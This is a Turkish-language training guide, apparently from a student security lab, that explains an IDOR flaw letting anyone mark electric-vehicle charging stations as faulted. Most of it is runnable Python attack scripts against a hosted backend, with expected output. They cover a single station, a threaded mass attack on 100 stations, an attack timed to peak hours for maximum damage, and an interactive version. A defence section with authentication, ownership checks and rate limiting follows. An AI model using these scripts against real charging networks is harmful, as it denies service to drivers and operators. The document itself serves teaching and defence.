# 🎯 Sahte Arıza Bildirimi (False Status) - SÜPER DETAYLI SALDIRI REHBERİ

**Senaryo ID:** `omer-fake-fault`  
**Sorumlu:** Ömer  
**Kategori:** Protocol/Availability  
**Zayıflık Türü:** IDOR (Insecure Direct Object Reference)  
**Şiddet Seviyesi:** 🔴 YÜKSEK

---

## 📚 İçindekiler
1. [Anomali Nedir?](#anomali-nedir)
2. [Zayıflık Detayları](#zayıflık-detayları)
3. [Saldırı Senaryoları](#saldırı-senaryoları)
4. [Adım Adım Uygulama](#adım-adım-uygulama)
5. [Savunma Yöntemleri](#savunma-yöntemleri)

---

## 🎓 Anomali Nedir?

### Basit Açıklama (Teknik Bilgisi Olmayanlara)
Bir şarj istasyonunun fiziksel olarak sağlam olmasına rağmen, sistemde "arızalı" görünmesini sağlayarak kullanılmaz hale getirme saldırısıdır.

**Günlük Hayattan Örnek:**
Bir kişi, başkasının evinin kapısına "Bu ev tehlikelidir, kullanılamaz" diye sahte bir not asıyor. Ev aslında gayet sağlam ama kimse oraya giremiyor.

### Teknik Açıklama
IDOR (Insecure Direct Object Reference) zayıflığı kullanılarak, herhangi bir kullanıcı kendi cihazı olmayan şarj istasyonlarının durumunu "FAULTED" (Arızalı) olarak değiştirebilir. Sistem, cihaz sahipliğini ve kimlik doğrulamayı kontrol etmediği için bu işlem başarılı olur.

---

## 🔓 Zayıflık Detayları

### Zayıflığın Bulunduğu Kod

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 311-345  
**Fonksiyon:** `report_device_fault()`

```python
@router.post("/report-fault")
def report_device_fault(device_id: str, fault_code: str, override_status: bool = False):
    """
    ZAYIFLIK: IDOR - Başkasının cihazını kontrol edebilirsiniz!
    """
    # ❌ SORUN: Kullanıcı doğrulaması YOK!
    # ❌ SORUN: Cihaz sahipliği kontrolü YOK!
    # ❌ SORUN: Herkes herhangi bir device_id kullanabilir!
    
    return {
        "device_id": device_id,
        "fault_reported": fault_code,
        "status": "FAULTED" if override_status else "AVAILABLE",
        "vulnerability": "IDOR - No authorization check!",
        "warning": "Can manipulate ANY device without authentication"
    }
```

### Zayıflığın Nedenleri

1. **Kimlik Doğrulama Yok:**
   - API endpoint'ine herkes erişebilir
   - API Key kontrolü yapılmıyor

2. **Yetkilendirme Kontrolü Yok:**
   - Kullanıcının cihaz sahibi olup olmadığı kontrol edilmiyor
   - Admin yetkisi gerekmiyor

3. **Input Validasyonu Zayıf:**
   - device_id parametresi herhangi bir değer alabilir
   - EVSE-001, EVSE-002, ... tüm cihazlar erişilebilir

4. **Rate Limiting Yok:**
   - Saldırgan binlerce cihazı aynı anda manipüle edebilir

---

## ⚔️ Saldırı Senaryoları

### Senaryo 1: Tek Cihaz Saldırısı (Basit)

**Amaç:** Belirli bir şarj istasyonunu devre dışı bırakmak

**Gereksinimler:**
- Python 3.x
- requests kütüphanesi

**Saldırı Kodu:**
```python
# Dosya: single_device_attack.py
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

# Hedef cihaz
target_device = "EVSE-001"

print(f"🎯 Hedef: {target_device}")
print("Sahte arıza raporu gönderiliyor...\n")

payload = {
    "device_id": target_device,
    "fault_code": "CRITICAL_OVERCURRENT_FAULT",
    "override_status": True  # Durumu FAULTED yap
}

response = requests.post(
    f"{BACKEND_URL}/vulnerable/report-fault",
    json=payload
)

result = response.json()

print("📊 SONUÇ:")
print(f"  Cihaz ID: {result['device_id']}")
print(f"  Arıza Kodu: {result['fault_reported']}")
print(f"  Durum: {result['status']}")
print(f"\n🚨 Zayıflık: {result['vulnerability']}")

if result['status'] == 'FAULTED':
    print(f"\n✅ BAŞARILI! {target_device} kullanılamaz hale getirildi!")
    print("⚠️ Gerçek sistemde şarj istasyonu artık kullanılamaz olacak.")
```

**Beklenen Çıktı:**
```
🎯 Hedef: EVSE-001
Sahte arıza raporu gönderiliyor...

📊 SONUÇ:
  Cihaz ID: EVSE-001
  Arıza Kodu: CRITICAL_OVERCURRENT_FAULT
  Durum: FAULTED

🚨 Zayıflık: IDOR - No authorization check!

✅ BAŞARILI! EVSE-001 kullanılamaz hale getirildi!
⚠️ Gerçek sistemde şarj istasyonu artık kullanılamaz olacak.
```

---

### Senaryo 2: Toplu Saldırı (Gelişmiş)

**Amaç:** Tüm şarj ağını çökertmek

**Saldırı Kodu:**
```python
# Dosya: mass_fault_attack.py
import requests
import time
from concurrent.futures import ThreadPoolExecutor

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

# Tüm hedef cihazlar (1-100 arası tüm istasyonlar)
targets = [f"EVSE-{i:03d}" for i in range(1, 101)]

def attack_device(device_id):
    """Tek bir cihaza saldır"""
    try:
        payload = {
            "device_id": device_id,
            "fault_code": "SYSTEM_FAILURE",
            "override_status": True
        }
        
        response = requests.post(
            f"{BACKEND_URL}/vulnerable/report-fault",
            json=payload,
            timeout=5
        )
        
        if response.status_code == 200:
            result = response.json()
            if result['status'] == 'FAULTED':
                print(f"✅ {device_id}: DEVRE DIŞI")
                return True
        
        print(f"❌ {device_id}: BAŞARISIZ")
        return False
        
    except Exception as e:
        print(f"⚠️ {device_id}: HATA - {e}")
        return False

print(f"""
╔════════════════════════════════════════╗
║   TOPLU SAHTE ARIZA SALDIRISI         ║
║   Hedef: {len(targets)} şarj istasyonu           ║
╚════════════════════════════════════════╝
""")

start_time = time.time()
success_count = 0

# 10 paralel thread ile saldır
with ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(attack_device, targets))
    success_count = sum(results)

elapsed_time = time.time() - start_time

print(f"""
\n📊 SALDIRI RAPORU:
═══════════════════════════════════════
  Toplam Hedef    : {len(targets)}
  Başarılı        : {success_count}
  Başarısız       : {len(targets) - success_count}
  Süre            : {elapsed_time:.2f} saniye
  Başarı Oranı    : {(success_count/len(targets)*100):.1f}%
═══════════════════════════════════════

🚨 ETKİ: {success_count} şarj istasyonu kullanılamaz hale getirildi!
⚠️ Binlerce kullanıcı şarj yapamayacak!
💰 Tahmini ekonomik kayıp: {success_count * 500} TL/saat
""")
```

---

### Senaryo 3: Zaman Ayarlı Saldırı (Stratejik)

**Amaç:** Belirli saatlerde (örn: yoğun saatlerde) saldırı yaparak maksimum hasar vermek

**Saldırı Kodu:**
```python
# Dosya: timed_attack.py
import requests
import time
from datetime import datetime

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

# Rush hour (Yoğun saatler)
PEAK_HOURS = [8, 9, 17, 18, 19]  # Sabah 8-9, Akşam 5-7

def is_peak_time():
    """Şimdi yoğun saat mi?"""
    current_hour = datetime.now().hour
    return current_hour in PEAK_HOURS

def mass_fault_attack():
    """Toplu arıza saldırısı"""
    targets = [f"EVSE-{i:03d}" for i in range(1, 51)]
    
    print(f"\n⚡ SALDIRI BAŞLATILIYOR - {datetime.now().strftime('%H:%M:%S')}")
    
    for device in targets:
        payload = {
            "device_id": device,
            "fault_code": "EMERGENCY_STOP",
            "override_status": True
        }
        
        try:
            requests.post(
                f"{BACKEND_URL}/vulnerable/report-fault",
                json=payload,
                timeout=2
            )
            print(f"  ✓ {device}")
        except:
            pass
    
    print(f"✅ {len(targets)} cihaz devre dışı bırakıldı!\n")

print("""
╔════════════════════════════════════════════╗
║   STRATEJİK ZAMANLI SALDIRI               ║
║   Target: Peak hours (Yoğun saatler)      ║
╚════════════════════════════════════════════╝

Sistem izleniyor... Yoğun saat bekleniyor...
(Ctrl+C ile durdurun)
""")

try:
    while True:
        if is_peak_time():
            print(f"\n🎯 YOĞUN SAAT TESPİT EDİLDİ! (Saat: {datetime.now().hour}:00)")
            mass_fault_attack()
            time.sleep(3600)  # 1 saat bekle
        else:
            print(f"⏳ Beklemede... Saat: {datetime.now().strftime('%H:%M:%S')}", end='\r')
            time.sleep(60)  # Her dakika kontrol et
            
except KeyboardInterrupt:
    print("\n\n⛔ Saldırı durduruldu.")
```

---

## 🛠️ Adım Adım Uygulama

### 1. Hazırlık (İlk Kez Yapılacaklar)

#### A. Python Kurulumu Kontrolü
```bash
# Terminali aç ve şunu yaz:
python --version

# Eğer "Python 3.x.x" görmüyorsan:
# https://www.python.org/downloads/ adresinden indir
# Kurulum sırasında "Add Python to PATH" kutusunu işaretle!
```

#### B. Gerekli Kütüphane
```bash
pip install requests
```

#### C. Klasör Oluştur
```bash
# Masaüstünde BSG_Attacks klasörü oluştur
cd Desktop
mkdir BSG_Attacks
cd BSG_Attacks
```

---

### 2. Saldırı Dosyasını Oluşturma

**Adım 1:** `BSG_Attacks` klasöründe `omer_attack.py` adında dosya oluştur

**Adım 2:** Aşağıdaki kodu yapıştır:

```python
# omer_attack.py - Ömer'in IDOR Saldırısı
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

print("""
╔═══════════════════════════════════════════╗
║  SAHTE ARIZA BİLDİRİMİ SALDIRISI         ║
║  Scenario ID: omer-fake-fault             ║
║  Vulnerability: IDOR                      ║
╚═══════════════════════════════════════════╝
""")

# Hedef cihaz listesi
targets = input("Hedef cihazlar (örn: EVSE-001,EVSE-002 veya 'all'): ")

if targets.lower() == 'all':
    device_list = [f"EVSE-{i:03d}" for i in range(1, 11)]
else:
    device_list = [d.strip() for d in targets.split(',')]

print(f"\n🎯 {len(device_list)} cihaz hedeflendi\n")

# Her cihaza saldır
success = 0
fail = 0

for device in device_list:
    try:
        payload = {
            "device_id": device,
            "fault_code": "ÖMER_CRITICAL_FAULT",
            "override_status": True
        }
        
        response = requests.post(
            f"{BACKEND_URL}/vulnerable/report-fault",
            json=payload,
            timeout=5
        )
        
        if response.status_code == 200:
            result = response.json()
            if result['status'] == 'FAULTED':
                print(f"✅ {device}: BAŞARILI - Devre dışı bırakıldı")
                success += 1
            else:
                print(f"⚠️ {device}: Durum değişmedi")
                fail += 1
        else:
            print(f"❌ {device}: HTTP {response.status_code}")
            fail += 1
            
    except Exception as e:
        print(f"❌ {device}: HATA - {e}")
        fail += 1

print(f"""
\n📊 SONUÇ:
════════════════════════════════
  Başarılı  : {success}
  Başarısız : {fail}
  Toplam    : {len(device_list)}
════════════════════════════════

🎉 Saldırı tamamlandı!
""")

# Web arayüzüne git
print("\n💡 Sonuçları görmek için:")
print("   https://simulasyon.vercel.app/ adresine git")
print("   'Active Runs' bölümünden senaryonu izle\n")
```

**Adım 3:** Dosyayı kaydet

---

### 3. Saldırıyı Çalıştırma

```bash
# Terminalde BSG_Attacks klasörüne git
cd Desktop/BSG_Attacks

# Saldırıyı başlat
python omer_attack.py
```

**Ekran Çıktısı:**
```
╔═══════════════════════════════════════════╗
║  SAHTE ARIZA BİLDİRİMİ SALDIRISI         ║
║  Scenario ID: omer-fake-fault             ║
║  Vulnerability: IDOR                      ║
╚═══════════════════════════════════════════╝

Hedef cihazlar (örn: EVSE-001,EVSE-002 veya 'all'): all

🎯 10 cihaz hedeflendi

✅ EVSE-001: BAŞARILI - Devre dışı bırakıldı
✅ EVSE-002: BAŞARILI - Devre dışı bırakıldı
✅ EVSE-003: BAŞARILI - Devre dışı bırakıldı
...

📊 SONUÇ:
════════════════════════════════
  Başarılı  : 10
  Başarısız : 0
  Toplam    : 10
════════════════════════════════

🎉 Saldırı tamamlandı!

💡 Sonuçları görmek için:
   https://simulasyon.vercel.app/ adresine git
   'Active Runs' bölümünden senaryonu izle
```

---

### 4. Sonuçları İzleme

1. Web tarayıcıda şu adrese git: **https://simulasyon.vercel.app/**

2. Ana sayfada "Start Simulation" butonuna tıkla ve `omer-fake-fault`  seçeneğini seç

3. Açılan sayfada:
   - 📊 **Metrics Tab:** Etkilenen cihaz sayısını gör
   - 📝 **Logs Tab:** Gerçek zamanlı saldırı loglarını izle
   - 📈 **Graphs:** Arıza bildirimlerinin grafiğini gör

**Beklenen Loglar:**
```
[INFO] Status=Faulted event for EVSE-001
[WARN] No physical fault codes detected
[ERROR] Anomaly detected: False status reporting
[CRITICAL] 10 devices marked as FAULTED without reason
```

---

## 🛡️ Savunma Yöntemleri

### 1. Kimlik Doğrulama Ekle

**Güvenli Kod:**
```python
from fastapi import HTTPException, Depends
from app.auth import get_current_user

@router.post("/report-fault")
def report_device_fault(
    device_id: str, 
    fault_code: str, 
    override_status: bool,
    current_user: User = Depends(get_current_user)  # ✅ Kullanıcı doğrula
):
    # Kullanıcı giriş yapmış mı kontrol et
    if not current_user:
        raise HTTPException(status_code=401, detail="Unauthorized")
    
    # Devamı...
```

### 2. Cihaz Sahipliği Kontrolü

```python
@router.post("/report-fault")
def report_device_fault(device_id: str, user: User = Depends(get_current_user)):
    # ✅ Kullanıcı bu cihazın sahibi mi?
    device = db.query(Device).filter(Device.id == device_id).first()
    
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    if device.owner_id != user.id and not user.is_admin:
        raise HTTPException(
            status_code=403, 
            detail="You don't have permission to access this device"
        )
    
    # Devamı...
```

### 3. Rate Limiting

```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/report-fault")
@limiter.limit("5/minute")  # ✅ Dakikada max 5 istek
def report_device_fault(...):
    # Kod...
```

### 4. Audit Logging

```python
@router.post("/report-fault")
def report_device_fault(device_id: str, user: User = Depends(get_current_user)):
    # ✅ Her işlemi logla
    audit_log.create({
        "user_id": user.id,
        "action": "REPORT_FAULT",
        "device_id": device_id,
        "timestamp": datetime.now(),
        "ip_address": request.client.host
    })
    
    # Devamı...
```

---

## 📝 Öğrenilen Dersler

### Bu Saldırıdan Neler Öğrendik?

1. **IDOR Nedir?**
   - Kullanıcıların başkalarının verilerine/kaynaklarına erişebilmesi
   - Yetkilendirme kontrollerinin eksikliği

2. **Gerçek Dünya Riskleri:**
   - Şarj istasyonları kullanılamaz hale gelebilir
   - Binlerce kullanıcı etkilenebilir
   - Ekonomik kayıplar oluşabilir

3. **Kritik Önem:**
   - Her API endpoint'inde kimlik doğrulama ŞART
   - Kullanıcı yetkileri mutlaka kontrol edilmeli
   - Audit logging her zaman aktif olmalı

---

## ❓ Sık Sorulan Sorular

**S: Bu saldırı gerçek hayatta çalışır mı?**  
C: Evet, maalesef birçok gerçek sistem benzer zayıflıklar içerir. Bu yüzden bu eğitim önemli.

**S: Saldırıyı  durdurabilir miyim?**  
C: Evet, Ctrl+C ile Python scriptini durdurabilirsin. Ancak gönderilmiş istekler geri alınamaz.

**S: Birden fazla saldırı aynı anda çalıştırabilir miyim?**  
C: Evet, her script bağımsızdır ve paralel çalışabilir.

**S: Gerçek sistemlerde denemek yasal mı?**  
C: ❌ HAYIR! Bu illegal ve etik dışıdır. SADECE bu eğitim platformunda kullan.

---

## 🔗 İlgili Kaynaklar

- [OWASP IDOR Rehberi](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [Tüm Saldırı Senaryoları](/docs/ATTACK_GUIDE_DETAILED.md)
- [Python SDK Kullanımı](/sdk/evcs_attack.py)

---

**Hazırlayan:** BSG Team - Ömer  
**Son Güncelleme:** 2024-12-23  
**Versiyon:** 2.0 - Süper Detaylı
